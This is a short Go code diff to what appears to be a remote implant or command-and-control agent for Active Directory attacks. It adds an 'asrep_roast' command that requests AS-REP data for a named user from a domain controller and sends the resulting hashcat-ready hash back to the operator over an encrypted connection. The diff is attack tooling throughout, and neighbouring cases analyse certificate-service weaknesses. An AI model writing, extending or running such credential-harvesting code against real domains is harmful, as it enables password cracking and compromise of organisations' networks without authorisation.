@@ -1882,6 +1882,28 @@ func runAdEnum(conn net.Conn, sess *crypto.Session, ae proto.AdEnumStart) {
 		for _, e := range tpls {
 			sendEntry(e)
 		}
+	case "asrep_roast":
+		if ae.RoastUser == "" || ae.RoastDC == "" {
+			sendMsg("asrep_roast requires --roast-user and --roast-dc", false, true)
+			return
+		}
+		roastOpts := adgo.RoastOptions{
+			DC:       ae.RoastDC,
+			Domain:   ae.RoastRealm,
+			Username: ae.RoastUser,
+			Port:     ae.RoastPort,
+		}
+		if roastOpts.Domain == "" {
+			roastOpts.Domain = base
+		}
+		res, err := adgo.ASREPRoast(context.Background(), roastOpts)
+		if err != nil {
+			sendMsg("asrep_roast error: "+err.Error(), false, false)
+			return
+		}
+		sendMsg("asrep_roast "+res.User+"@"+res.Realm, true, false)
+		sendMsg(res.HashcatLine, true, false)
+
 	case "adcs_analyze":
 		cas, tpls, _ := adgo.EnumerateADCS(base, c)
 		caRisks, tplRisks := adgo.AnalyzeADCS(cas, tpls)
